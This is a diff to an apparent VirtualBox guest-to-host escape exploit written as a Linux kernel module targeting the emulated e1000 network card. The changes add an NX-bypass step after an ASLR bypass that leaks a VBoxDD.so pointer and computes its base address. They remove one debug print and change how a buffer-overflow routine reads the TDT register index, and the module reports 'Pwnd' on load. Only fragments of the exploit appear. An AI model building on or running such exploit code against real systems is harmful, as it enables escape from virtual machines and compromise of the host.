@@ -50,6 +50,7 @@ static int __init e1k_init(void)
 	}
 	e1k_configure();
     aslr_bypass();
+    nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -321,7 +322,6 @@ static uint64_t aslr_bypass(void)
 
     uint64_t leaked_vboxdd_ptr = *((uint64_t *) leaked_bytes);
     uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
-    pr_info("Leaked VBoxDD.so string : %s\n", (char *) leaked_vboxdd_ptr);
     pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
     pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
@@ -330,7 +330,7 @@ static uint64_t aslr_bypass(void)
 
 static void buffer_overflow(void)
 {
-	extern int	idx;
+	int			idx = get_register(TDT);
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
